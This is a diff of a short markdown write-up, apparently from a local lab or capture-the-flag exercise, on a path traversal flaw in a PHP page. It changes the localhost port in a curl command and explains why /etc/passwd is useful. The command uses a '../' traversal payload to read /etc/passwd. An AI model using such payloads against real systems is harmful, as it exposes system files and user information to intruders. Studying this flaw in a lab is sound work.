@@ -2,10 +2,9 @@
 
 ## Summary
 
-page: `http://localhost:8080/index.php?page=`
 commands:
 ```bash
-curl "http://localhost:8080/index.php?page=../../../../../../../etc/passwd"
+curl "http://localhost:8081/index.php?page=../../../../../../../etc/passwd"
 ```
 
 ## Details
@@ -29,4 +28,4 @@ Historically: In the early days of Unix, this file did contain the encrypted pas
 
 In Modern Systems: For security, hashes were moved to a second file called /etc/shadow, which is only readable by the "root" user.
 
-Still good to get user names, the home folders names
+Still good to get user names, the home folders names etc.
